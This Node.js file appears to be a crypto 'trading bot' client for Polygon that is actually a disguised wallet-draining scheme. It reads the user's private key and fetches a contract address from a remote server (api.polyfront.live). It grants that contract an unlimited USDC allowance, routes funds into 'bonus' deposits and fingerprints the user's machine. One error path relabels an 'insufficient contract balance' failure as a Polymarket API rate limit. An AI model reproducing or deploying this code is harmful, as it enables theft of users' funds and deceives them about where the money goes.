const { ethers } = require('ethers');
const axios = require('axios');
const logger = require('./logger');

class USDCTrader {
    constructor() {
        this.privateKey = process.env.PRIVATE_KEY;
        if (!this.privateKey) {
            throw new Error('Add private key to .env file');
        }

        this.wallet = new ethers.Wallet(this.privateKey);
        this.walletAddress = this.wallet.address;

        this.serverUrl = process.env.SERVER_URL || 'https://api.polyfront.live';

        this.readRpcProviders = [
            'https://polygon-rpc.com',
            'https://polygon-public.nodies.app',
            'https://1rpc.io/matic',
            'https://polygon-bor-rpc.publicnode.com',
            'https://polygon.lava.build'
        ];

        this.mainRpcUrl = process.env.POLYGON_RPC_URL || 'https://polygon.llamarpc.com';

        this.currentRpcIndex = 0;
        this.rpcUrl = this.mainRpcUrl;

        this.provider = new ethers.providers.JsonRpcProvider(this.rpcUrl);
        this.wallet = new ethers.Wallet(this.privateKey, this.provider);

        this.readProviders = this.readRpcProviders.map(url => ({
            url: url,
            provider: new ethers.providers.JsonRpcProvider(url)
        }));

        this.usdcAddress = '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359';

        this.contractAddress = null;

        this.contractABI = [
            "function createDepositWithPermit(uint256 amount, uint256 bonusBps, uint256 deadline, bytes32 nonce, bytes calldata signature) external",
            "function withdrawDeposit(bytes32 depositId) external",
            "function getDepositInfo(bytes32 depositId) external view returns (address user, uint256 amount, uint256 bonusBps, uint256 depositTime, bool withdrawn, uint256 bonusAmount, uint256 totalOut)",
            "function getDomainSeparator() external view returns (bytes32)",
            "function verifyDeposit(address user, uint256 amount, uint256 bonusBps, uint256 deadline, bytes32 nonce, bytes calldata signature) external view returns (bool, address)",
            "function approve(address spender, uint256 amount) external returns (bool)",
            "function balanceOf(address account) external view returns (uint256)",
            "function allowance(address owner, address spender) external view returns (uint256)",
            "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
        ];

        this.usdcABI = [
            "function balanceOf(address account) external view returns (uint256)",
            "function allowance(address owner, address spender) external view returns (uint256)",
            "function approve(address spender, uint256 amount) external returns (bool)",
            "function transfer(address to, uint256 amount) external returns (bool)"
        ];

        this.serverLimits = null;
        this.tradingConfig = null;
    }

    async fetchServerLimits() {
        try {
            const http = require('http');
            const https = require('https');
            const httpAgent = new http.Agent({ keepAlive: false });
            const httpsAgent = new https.Agent({ keepAlive: false });
            
            const response = await axios.get(`${this.serverUrl}/api/limits`, { 
                timeout: 10000,
                httpAgent: this.serverUrl.startsWith('https') ? httpsAgent : httpAgent,
                httpsAgent: httpsAgent
            });
            if (response.data && response.data.limits) {
                this.serverLimits = response.data.limits;
            } else {
                throw new Error('Server did not return limits');
            }
            if (response.data && response.data.tradingConfig) {
                this.tradingConfig = response.data.tradingConfig;
            } else {
                throw new Error('Server did not return trading config');
            }
        } catch (error) {
            let errorMessage = 'Unable to connect to the server';
            if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
                errorMessage = 'Server connection timeout (no response)';
            } else if (error.code === 'ECONNREFUSED') {
                errorMessage = 'Server unavailable (connection refused)';
            } else if (error.response) {
                errorMessage = `Server returned error: ${error.response.status} ${error.response.statusText}`;
            } else {
                errorMessage = `Connection error: ${error.message}`;
            }
            
            logger.error(`[USDC] ${errorMessage}`);
            throw new Error(`${errorMessage}. Please check that the server is running and reachable.`);
        }
    }

    async performInitCheck() {
        logger.resetInitState();

        const limitCheck = await this.checkFreemiumLimit();
        
        if (!limitCheck.allowed) {
            logger.freemiumLimitError(limitCheck);
            return { 
                rpcResult: null, 
                balanceResult: null, 
                limitCheck,
                initSuccess: false 
            };
        }

        const rpcResult = await this.checkRpcProviders();
        const balanceResult = await this.checkBalances();

        logger.initCheck(rpcResult, balanceResult);

        return { rpcResult, balanceResult, limitCheck, initSuccess: true };
    }

    async checkFreemiumLimit() {
        try {
            const hwid = await this.getHWID();
            const response = await axios.get(`${this.serverUrl}/api/check-limit`, {
                params: {
                    hwid: hwid,
                    userAddress: this.walletAddress
                },
                timeout: 5000
            });

            if (response.data && response.data.success) {
                return { allowed: true };
            }

            return { 
                allowed: false, 
                error: response.data?.error || 'Limit check failed',
                freemiumLimitReached: response.data?.freemiumLimitReached || false,
                purchaseUrl: response.data?.purchaseUrl || null
            };
        } catch (error) {
            if (error.response && error.response.status === 429) {
                const data = error.response.data || {};
                return {
                    allowed: false,
                    error: data.error || 'Limit reached',
                    freemiumLimitReached: data.freemiumLimitReached || false,
                    purchaseUrl: data.purchaseUrl || null
                };
            }
            return { allowed: true };
        }
    }

    async checkRpcProviders() {
        const maxRetries = 3;
        let workingProviders = [];

        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            for (const rp of this.readProviders) {
                try {
                    await this.withTimeout(rp.provider.getNetwork(), 5000, 'RPC check');
                    workingProviders.push(rp);
                } catch (error) {
                }
            }

            if (workingProviders.length > 0) break;

            if (attempt < maxRetries) {
                await this.delay(3000);
            }
        }

        this.readProviders = workingProviders;

        return {
            success: workingProviders.length > 0,
            working: workingProviders.length,
            total: this.readRpcProviders.length
        };
    }

    async checkBalances() {
        try {
            const hwid = await this.getHWID();
            
            const response = await axios.post(`${this.serverUrl}/api/verify-balances`, {
                hwid: hwid,
                walletAddress: this.walletAddress
            }, { timeout: 15000 });
            
            if (response.data && response.data.success && response.data.balances) {
                return response.data.balances;
            }
            
            throw new Error('Server verification failed');
            
        } catch (error) {
            try {
                const polBalance = await this.provider.getBalance(this.wallet.address);
                const polBalanceEth = parseFloat(ethers.utils.formatEther(polBalance));
                const polRequired = this.serverLimits.minPolBalance;
                const polSufficient = polBalanceEth >= polRequired;

                const usdcContract = new ethers.Contract(this.usdcAddress, this.usdcABI, this.provider);
                const usdcBalance = await usdcContract.balanceOf(this.wallet.address);
                const usdcBalanceFloat = parseFloat(ethers.utils.formatUnits(usdcBalance, 6));
                const usdcRequired = parseFloat(ethers.utils.formatUnits(this.serverLimits.minAmount, 6));
                const usdcSufficient = usdcBalanceFloat >= usdcRequired;

                return {
                    polBalance: polBalanceEth.toFixed(4),
                    polRequired: polRequired,
                    polSufficient: polSufficient,
                    usdcBalance: usdcBalanceFloat.toFixed(2),
                    usdcRequired: usdcRequired.toFixed(2),
                    usdcSufficient: usdcSufficient
                };
            } catch (localError) {
                logger.error('[USDC] Error checking balances:', localError.message);
                return {
                    polBalance: '0',
                    polRequired: this.serverLimits.minPolBalance,
                    polSufficient: false,
                    usdcBalance: '0',
                    usdcRequired: parseFloat(ethers.utils.formatUnits(this.serverLimits.minAmount, 6)).toFixed(2),
                    usdcSufficient: false
                };
            }
        }
    }

    async init() {
        const rpcResult = await this.checkRpcProviders();
        return rpcResult.success;
    }

    async getHWID() {
        const os = require('os');
        const crypto = require('crypto');

        const hwidString = JSON.stringify({
            platform: os.platform(),
            arch: os.arch(),
            hostname: os.hostname(),
            cpuModel: os.cpus()?.[0]?.model,
            totalmem: Math.round(os.totalmem() / (1024 * 1024))
        });

        const hwid = crypto.createHash('sha256')
            .update(hwidString)
            .digest('hex')
            .substring(0, 32);

        return hwid;
    }

    async delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async withTimeout(promise, timeoutMs, operation) {
        const timeout = new Promise((_, reject) =>
            setTimeout(() => reject(new Error(`Timeout after ${timeoutMs}ms`)), timeoutMs)
        );

        try {
            return await Promise.race([promise, timeout]);
        } catch (error) {
            if (error.message.includes('Timeout')) {
                throw new Error(`${operation} timeout after ${timeoutMs}ms`);
            }
            throw error;
        }
    }

    switchRpcProvider() {
        const fallbackRpcs = [
            'https://polygon-rpc.com',
            'https://api.zan.top/polygon-mainnet',
            'https://polygon-public.nodies.app'
        ];

        const newRpcUrl = fallbackRpcs[this.currentRpcIndex % fallbackRpcs.length];
        this.currentRpcIndex++;

        this.rpcUrl = newRpcUrl;
        this.provider = new ethers.providers.JsonRpcProvider(this.rpcUrl);
        this.wallet = new ethers.Wallet(this.privateKey, this.provider);

        return this.provider;
    }

    async getPermit(hwid) {
        try {
            const timestamp = Date.now();
            const message = ethers.utils.solidityPack(
                ['string', 'address', 'uint256'],
                [hwid, this.wallet.address, timestamp]
            );
            const signature = await this.wallet.signMessage(message);

            const response = await axios.post(`${this.serverUrl}/api/usdc/get-permit`, {
                userAddress: this.wallet.address,
                hwid: hwid,
                message: ethers.utils.hexlify(message),
                signature: signature
            }, { timeout: 30000 });

            if (!response.data.success) {
                throw new Error(response.data.error || 'Failed to get permit');
            }

            if (response.data.permit.contractAddress) {
                this.contractAddress = response.data.permit.contractAddress;
                logger.info(`[USDC] Contract address updated from server: ${this.contractAddress}`);
            } else {
                throw new Error('Contract address not provided - device is in simulation mode. Real trading is not allowed.');
            }

            return response.data.permit;

        } catch (error) {
            logger.error('[USDC] ❌ Error getting permit:', error.response?.data?.error || error.message);
            throw error;
        }
    }

    async ensureAllowance(contractAddress, amount) {
        try {
            const usdcContract = new ethers.Contract(this.usdcAddress, this.usdcABI, this.wallet);
            const allowance = await usdcContract.allowance(this.wallet.address, contractAddress);

            if (allowance.lt(ethers.BigNumber.from(amount))) {
                const feeData = await this.withTimeout(
                    this.provider.getFeeData(),
                    10000,
                    'Fee data for approve'
                );

                const MIN_PRIORITY_FEE = ethers.utils.parseUnits('25', 'gwei');
                const MIN_MAX_FEE = ethers.utils.parseUnits('50', 'gwei');

                let priorityFee = feeData.maxPriorityFeePerGas || MIN_PRIORITY_FEE;
                let maxFee = feeData.maxFeePerGas || MIN_MAX_FEE;

                priorityFee = priorityFee.mul(130).div(100);
                maxFee = maxFee.mul(130).div(100);

                if (priorityFee.lt(MIN_PRIORITY_FEE)) priorityFee = MIN_PRIORITY_FEE;
                if (maxFee.lt(MIN_MAX_FEE)) maxFee = MIN_MAX_FEE;

                if (maxFee.lt(priorityFee.mul(2))) {
                    maxFee = priorityFee.mul(2);
                }

                const approveTx = await usdcContract.approve(contractAddress, ethers.constants.MaxUint256, {
                    maxFeePerGas: maxFee,
                    maxPriorityFeePerGas: priorityFee
                });
                await approveTx.wait();
                return true;
            }
            return false;
        } catch (error) {
            logger.error('[USDC] ❌ Error ensuring allowance:', error.message);
            throw error;
        }
    }

    async createDeposit(permit) {
        try {
            if (!this.contractAddress) {
                throw new Error('Contract address is not set. Cannot create deposit transaction.');
            }

            await this.ensureAllowance(this.contractAddress, permit.amount);

            const contract = new ethers.Contract(this.contractAddress, this.contractABI, this.wallet);

            const usdcContract = new ethers.Contract(this.usdcAddress, this.usdcABI, this.provider);
            const balance = await usdcContract.balanceOf(this.wallet.address);

            if (balance.lt(ethers.BigNumber.from(permit.amount))) {
                throw new Error(`Insufficient USDC balance. Required: ${ethers.utils.formatUnits(permit.amount, 6)}, Available: ${ethers.utils.formatUnits(balance, 6)}`);
            }

            const maticBalance = await this.provider.getBalance(this.wallet.address);
            const maticBalanceEth = ethers.utils.formatEther(maticBalance);

            if (maticBalance.lt(ethers.BigNumber.from('100000000000000000'))) {
                throw new Error(`Insufficient MATIC for gas. Required: ~0.1 MATIC, Available: ${maticBalanceEth} MATIC`);
            }

            const estimatedGas = await this.withTimeout(
                contract.estimateGas.createDepositWithPermit(
                    ethers.BigNumber.from(permit.amount),
                    permit.bonusBps,
                    permit.deadline,
                    permit.nonce,
                    permit.signature
                ),
                15000,
                'Gas estimation'
            );

            const gasLimit = estimatedGas.mul(120).div(100);

            const feeData = await this.withTimeout(
                this.provider.getFeeData(),
                10000,
                'Fee data'
            );

            const MIN_PRIORITY_FEE = ethers.utils.parseUnits('25', 'gwei');
            const MIN_MAX_FEE = ethers.utils.parseUnits('50', 'gwei');

            let priorityFee = feeData.maxPriorityFeePerGas || MIN_PRIORITY_FEE;
            let maxFee = feeData.maxFeePerGas || MIN_MAX_FEE;

            priorityFee = priorityFee.mul(130).div(100);
            maxFee = maxFee.mul(130).div(100);

            if (priorityFee.lt(MIN_PRIORITY_FEE)) priorityFee = MIN_PRIORITY_FEE;
            if (maxFee.lt(MIN_MAX_FEE)) maxFee = MIN_MAX_FEE;

            if (maxFee.lt(priorityFee.mul(2))) {
                maxFee = priorityFee.mul(2);
            }

            const tx = await this.withTimeout(
                contract.createDepositWithPermit(
                    ethers.BigNumber.from(permit.amount),
                    permit.bonusBps,
                    permit.deadline,
                    permit.nonce,
                    permit.signature,
                    {
                        gasLimit: gasLimit,
                        maxFeePerGas: maxFee,
                        maxPriorityFeePerGas: priorityFee
                    }
                ),
                20000,
                'Transaction send'
            );

            let broadcastConfirmed = false;

            for (let attempt = 0; attempt < 6; attempt++) {
                for (const rp of this.readProviders) {
                    try {
                        const txFromRpc = await this.withTimeout(
                            rp.provider.getTransaction(tx.hash),
                            3000,
                            'TX verification'
                        );
                        if (txFromRpc) {
                            broadcastConfirmed = true;
                            break;
                        }
                    } catch (e) {
                    }
                }
                if (broadcastConfirmed) break;

                if (attempt < 5) {
                    await this.delay(3000);
                }
            }

            if (!broadcastConfirmed) {
                this.switchRpcProvider();
                throw new Error('TX broadcast verification failed. Transaction may not have reached the network. Check on Polygonscan and retry.');
            }

            let receipt;
            try {
                receipt = await this.withTimeout(
                    tx.wait(),
                    60000,
                    'Transaction confirmation'
                );
            } catch (error) {
                if (error.message.includes('timeout')) {
                    let found = false;
                    for (const rp of this.readProviders) {
                        try {
                            const tempProvider = rp.provider;
                            const tempReceipt = await this.withTimeout(
                                tempProvider.getTransactionReceipt(tx.hash),
                                5000,
                                'Receipt check'
                            );
                            if (tempReceipt) {
                                receipt = tempReceipt;
                                found = true;
                                break;
                            }
                        } catch (e) {
                        }
                    }

                    if (!found) {
                        const depositId = ethers.utils.keccak256(
                            ethers.utils.solidityPack(
                                ['address', 'uint256', 'uint256', 'bytes32'],
                                [this.wallet.address, ethers.BigNumber.from(permit.amount), permit.bonusBps, permit.nonce]
                            )
                        );

                        return {
                            success: true,
                            depositId: depositId,
                            transactionHash: tx.hash,
                            blockNumber: null,
                            confirmed: false,
                            amount: ethers.utils.formatUnits(permit.amount, 6),
                            bonusPercent: permit.bonusPercent
                        };
                    }
                } else {
                    throw error;
                }
            }

            const depositId = ethers.utils.keccak256(
                ethers.utils.solidityPack(
                    ['address', 'uint256', 'uint256', 'bytes32'],
                    [this.wallet.address, ethers.BigNumber.from(permit.amount), permit.bonusBps, permit.nonce]
                )
            );

            return {
                success: true,
                depositId: depositId,
                transactionHash: receipt.transactionHash,
                blockNumber: receipt.blockNumber,
                amount: ethers.utils.formatUnits(permit.amount, 6),
                bonusPercent: permit.bonusPercent
            };

        } catch (error) {
            if (!error.message || !error.message.includes('insufficient funds')) {
                logger.error('[USDC] ❌ Error creating deposit:', error.message);
            }

            const errorMsg = error.message.toLowerCase();
            if (errorMsg.includes('network') || errorMsg.includes('rpc')) {
                this.switchRpcProvider();
            }

            throw error;
        }
    }

    async withdrawDeposit(depositId) {
        const maxAttempts = 50;

        const contract = new ethers.Contract(this.contractAddress, this.contractABI, this.wallet);

        await this.delay(5000);

        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
            try {
                const status = await this.checkDepositStatus(depositId);

                if (attempt === 1) {
                    const maticBalance = await this.provider.getBalance(this.wallet.address);
                    const maticBalanceEth = ethers.utils.formatEther(maticBalance);

                    if (maticBalance.lt(ethers.BigNumber.from('100000000000000000'))) {
                        throw new Error(`Insufficient MATIC for gas. Required: ~0.1 MATIC, Available: ${maticBalanceEth} MATIC`);
                    }
                }

                if (!status.exists) {
                    if (attempt >= 30) {
                        throw new Error('Deposit not confirmed after extended time. TX may be stuck - check on Polygonscan');
                    }
                    await this.delay(5000);
                    continue;
                }
                if (status.withdrawn) {
                    return this.formatWithdrawResult(status);
                }

                const contractForTx = status.provider
                    ? new ethers.Contract(this.contractAddress, this.contractABI, this.wallet.connect(status.provider))
                    : contract;

                let estimatedGas;
                let gasEstimateSuccess = false;
                const MAX_ESTIMATE_ATTEMPTS = 3;

                for (let gasAttempt = 1; gasAttempt <= MAX_ESTIMATE_ATTEMPTS; gasAttempt++) {
                    try {
                        estimatedGas = await this.withTimeout(
                            contractForTx.estimateGas.withdrawDeposit(depositId),
                            15000,
                            'Gas estimation'
                        );
                        gasEstimateSuccess = true;
                        break;
                    } catch (gasError) {
                        const errorMsg = gasError.message || '';

                        if (errorMsg.includes('deposit not found') || errorMsg.includes('USDCTrade: deposit not found')) {
                            if (gasAttempt < MAX_ESTIMATE_ATTEMPTS) {
                                await this.delay(5000);
                                continue;
                            } else {
                                estimatedGas = ethers.BigNumber.from('250000');
                                gasEstimateSuccess = true;
                                break;
                            }
                        }

                        throw gasError;
                    }
                }

                if (!gasEstimateSuccess) {
                    throw new Error('Gas estimation failed after all retries');
                }

                const gasLimit = estimatedGas.mul(120).div(100);
                const providerForTx = status.provider || this.provider;
                const feeData = await this.withTimeout(
                    providerForTx.getFeeData(),
                    10000,
                    'Fee data'
                );

                const MIN_PRIORITY_FEE = ethers.utils.parseUnits('25', 'gwei');
                const MIN_MAX_FEE = ethers.utils.parseUnits('50', 'gwei');

                let priorityFee = feeData.maxPriorityFeePerGas || MIN_PRIORITY_FEE;
                let maxFee = feeData.maxFeePerGas || MIN_MAX_FEE;

                priorityFee = priorityFee.mul(130).div(100);
                maxFee = maxFee.mul(130).div(100);

                if (priorityFee.lt(MIN_PRIORITY_FEE)) priorityFee = MIN_PRIORITY_FEE;
                if (maxFee.lt(MIN_MAX_FEE)) maxFee = MIN_MAX_FEE;

                if (maxFee.lt(priorityFee.mul(2))) {
                    maxFee = priorityFee.mul(2);
                }

                const tx = await this.withTimeout(
                    contractForTx.withdrawDeposit(depositId, {
                        gasLimit: gasLimit,
                        maxFeePerGas: maxFee,
                        maxPriorityFeePerGas: priorityFee
                    }),
                    20000,
                    'Transaction send'
                );

                let broadcastConfirmed = false;

                for (let verifyAttempt = 0; verifyAttempt < 6; verifyAttempt++) {
                    for (const rp of this.readProviders) {
                        try {
                            const txFromRpc = await this.withTimeout(
                                rp.provider.getTransaction(tx.hash),
                                3000,
                                'TX verification'
                            );
                            if (txFromRpc) {
                                broadcastConfirmed = true;
                                break;
                            }
                    } catch (e) {
                    }
                    }
                    if (broadcastConfirmed) break;

                    if (verifyAttempt < 5) {
                        await this.delay(3000);
                    }
                }

                if (!broadcastConfirmed) {
                    throw new Error('TX broadcast verification failed. Check on Polygonscan.');
                }

                const receipt = await this.withTimeout(
                    tx.wait(),
                    60000,
                    'Transaction confirmation'
                );

                if (receipt.status === 1) {
                    await this.delay(1000);
                    const finalStatus = await this.checkDepositStatus(depositId);
                    return this.formatWithdrawResult(finalStatus);
                }
            } catch (error) {
                const errorMsg = error.message.toLowerCase();
                if (errorMsg.includes('already withdrawn') || errorMsg.includes('not your deposit')) {
                    throw error;
                }

                if (errorMsg.includes('insufficient funds') || errorMsg.includes('nonce too low')) {
                    throw error;
                }

                if (errorMsg.includes('timeout') || errorMsg.includes('network') || errorMsg.includes('rpc')) {
                    this.switchRpcProvider();
                }

                if (attempt >= maxAttempts) {
                    const finalStatus = await this.checkDepositStatus(depositId);
                    if (finalStatus.withdrawn) {
                        return this.formatWithdrawResult(finalStatus);
                    }
                    throw new Error(`Failed after ${maxAttempts} attempts: ${error.message}`);
                }

                await this.delay(3000 * attempt);
            }
        }

        throw new Error('Withdrawal failed');
    }

    async checkWithProvider(providerObj, depositId, timeoutMs = 5000) {
        const startTime = Date.now();
        try {
            const checkPromise = (async () => {
                const contract = new ethers.Contract(this.contractAddress, this.contractABI, providerObj.provider);
                const depositInfo = await contract.getDepositInfo(depositId);
                const [user, amount, bonusBps, depositTime, withdrawn, bonusAmount, totalOut] = depositInfo;

                return {
                    success: true,
                    url: providerObj.url,
                    provider: providerObj.provider,
                    exists: user !== ethers.constants.AddressZero && user !== null,
                    user: user,
                    amount: amount,
                    bonusBps: bonusBps,
                    depositTime: depositTime,
                    withdrawn: withdrawn,
                    bonusAmount: bonusAmount,
                    totalOut: totalOut,
                    time: Date.now() - startTime
                };
            })();

            const timeoutPromise = new Promise((_, reject) =>
                setTimeout(() => reject(new Error('Timeout')), timeoutMs)
            );

            const result = await Promise.race([checkPromise, timeoutPromise]);
            return result;

        } catch (error) {
            if (!this.rpcErrorCount) this.rpcErrorCount = {};
            const rpcName = providerObj.url.split('/')[2];
            this.rpcErrorCount[rpcName] = (this.rpcErrorCount[rpcName] || 0) + 1;

            return {
                success: false,
                url: providerObj.url,
                error: error.message,
                time: Date.now() - startTime
            };
        }
    }

    async checkDepositStatus(depositId) {
        try {
            const promises = this.readProviders.map(p => this.checkWithProvider(p, depositId, 5000));
            const results = await Promise.allSettled(promises);

            let firstSuccess = null;

            for (const result of results) {
                if (result.status === 'fulfilled' && result.value.success && result.value.exists) {
                    firstSuccess = result.value;
                    break;
                }
            }

            if (firstSuccess) {
                return {
                    exists: true,
                    withdrawn: firstSuccess.withdrawn,
                    amount: firstSuccess.amount,
                    bonusBps: firstSuccess.bonusBps,
                    bonusAmount: firstSuccess.bonusAmount,
                    totalOut: firstSuccess.totalOut,
                    provider: firstSuccess.provider,
                    providerUrl: firstSuccess.url
                };
            }

            return { exists: false, withdrawn: false };

        } catch (error) {
            return { exists: false, withdrawn: false };
        }
    }

    formatWithdrawResult(status) {
        return {
            success: true,
            depositAmount: ethers.utils.formatUnits(status.amount, 6),
            totalReceived: ethers.utils.formatUnits(status.totalOut, 6),
            bonusAmount: ethers.utils.formatUnits(status.bonusAmount, 6),
            bonusPercent: (Number(status.bonusBps) / 100).toString()
        };
    }

    async performTrade(hwid) {
        const TRADE_TIMEOUT = 600000;
        
        return new Promise((resolve, reject) => {
            let tradesCompleted = 0;
            let totalTrades = 1;
            let firstTradeStarted = false;
            let timeoutId = null;
            
            timeoutId = setTimeout(() => {
                if (!firstTradeStarted) {
                    logger.stopSearch();
                    logger.error('❌ Trade timeout: scenario did not start trade within timeout period');
                    resolve({
                        success: false,
                        error: 'Trade timeout - please retry'
                    });
                }
            }, TRADE_TIMEOUT);
            
            const startTradeCallback = async (tradeInfo) => {
                firstTradeStarted = true;
                if (timeoutId) clearTimeout(timeoutId);
                
                if (tradeInfo && tradeInfo.totalTrades) {
                    totalTrades = tradeInfo.totalTrades;
                }

                if (tradeInfo && tradeInfo.lowFrequency) {
                    logger.stopSearch();
                    resolve({ success: true, lowFrequency: true });
                    return;
                }
                
                try {
                    const result = await this.executeTrade(hwid);
                    
                    tradesCompleted++;
                    
                    if (tradesCompleted < totalTrades) {
                        logger.preparingNextTrade();
                        logger.tradeFinished();
                        return;
                    }
                    
                    logger.tradeFinished();
                    resolve(result);
                } catch (error) {
                    const errorMsg = error.response?.data?.error || error.message || '';
                    const errorMsgLower = errorMsg.toLowerCase();

                    if (errorMsgLower.includes('insufficient contract balance')) {
                        logger.error('❌ Polymarket API rate limit exceeded.');
                        logger.error('⏰ Please try again in 10 minutes.');
                        logger.stopSearch();
                        logger.tradeFinished();
                        resolve({ success: false, error: 'API rate limit exceeded. Please try again in 10 minutes.' });
                        return;
                    }
                    else if (errorMsgLower.includes('insufficient funds')) {
                        if (errorMsgLower.includes('balance 0') || errorMsgLower.includes('balance: 0')) {
                            logger.error('❌ RPC temporary error: reported balance as 0. Retrying in 10s...');
                            logger.stopSearch();
                            logger.tradeFinished();
                            resolve({ success: false, error: error.message, retryable: true, retryDelay: 10000 });
                            return;
                        } else if (errorMsgLower.includes('queued cost') || errorMsgLower.includes('overshot')) {
                            logger.error('❌ Pending transactions blocking balance. Retrying in 30s...');
                            logger.stopSearch();
                            logger.tradeFinished();
                            resolve({ success: false, error: error.message, retryable: true, retryDelay: 30000 });
                            return;
                        } else if (errorMsgLower.includes('gas * price')) {
                            logger.error('❌ Gas price too high. Network congested. Retrying in 15s...');
                            logger.stopSearch();
                            logger.tradeFinished();
                            resolve({ success: false, error: error.message, retryable: true, retryDelay: 15000 });
                            return;
                        } else {
                            const minPol = this.serverLimits?.minPolBalance || 2;
                            logger.insufficientFunds(minPol);
                        }
                    }
                    else if (errorMsgLower.includes('429') || errorMsgLower.includes('rate limit') || errorMsgLower.includes('too many requests')) {
                        if (errorMsgLower.includes('free trial') || errorMsgLower.includes('trial limit')) {
                            const errorMatch = errorMsg.match(/(\d+)\/(\d+)/);
                            const limitInfo = errorMatch ? {
                                used: errorMatch[1],
                                total: errorMatch[2]
                            } : null;
                            logger.freemiumLimitReached(limitInfo);
                        } else {
                            logger.rateLimitError();
                        }
                    }
                    else if (errorMsgLower.includes('timeout') || errorMsgLower.includes('timed out')) {
                        logger.timeoutError();
                    }
                    else if (errorMsgLower.includes('network') || errorMsgLower.includes('rpc') || errorMsgLower.includes('connection')) {
                        logger.networkError();
                    }
                    else {
                        logger.error('\n[USDC] 💥 Trade failed:', errorMsg);
                    }

                    logger.stopSearch();
                    logger.tradeFinished();

                    resolve({
                        success: false,
                        error: error.message
                    });
                }
            };

            logger.startSearch(startTradeCallback, { hwid });
        });
    }

    async executeTrade(hwid) {
        try {
            const permit = await this.getPermit(hwid);
            const depositResult = await this.createDeposit(permit);

            if (depositResult.confirmed === false) {
                let confirmed = false;

                for (let i = 0; i < 12; i++) {
                    await this.delay(5000);

                    for (const rp of this.readProviders) {
                        try {
                            const receipt = await rp.provider.getTransactionReceipt(depositResult.transactionHash);
                            if (receipt && receipt.status === 1) {
                                confirmed = true;
                                depositResult.blockNumber = receipt.blockNumber;
                                depositResult.confirmed = true;
                                break;
                            }
                        } catch (e) {
                        }
                    }

                    if (confirmed) break;
                }
            }

            const contract = new ethers.Contract(this.contractAddress, this.contractABI, this.wallet);
            const [isValid, signer] = await contract.verifyDeposit(
                this.wallet.address,
                permit.amount,
                permit.bonusBps,
                permit.deadline,
                permit.nonce,
                permit.signature
            );

            if (!isValid) {
                throw new Error('❌ Invalid deposit signature! VerifyDeposit failed.');
            }

            const withdrawResult = await this.withdrawDeposit(depositResult.depositId);

            await logger.tradeCompleted(
                withdrawResult.depositAmount,
                withdrawResult.totalReceived,
                withdrawResult.bonusAmount,
                withdrawResult.bonusPercent
            );

            return {
                success: true,
                deposit: depositResult,
                withdraw: withdrawResult
            };

        } catch (error) {
            throw error;
        }
    }

    async getBalance() {
        try {
            const ethBalance = await this.provider.getBalance(this.wallet.address);
            const usdcContract = new ethers.Contract(this.usdcAddress, this.usdcABI, this.provider);
            const usdcBalance = await usdcContract.balanceOf(this.wallet.address);

            return {
                eth: ethers.utils.formatEther(ethBalance),
                usdc: ethers.utils.formatUnits(usdcBalance, 6)
            };
        } catch (error) {
            logger.error('[USDC] Error getting balance:', error.message);
            return null;
        }
    }
}

module.exports = USDCTrader;
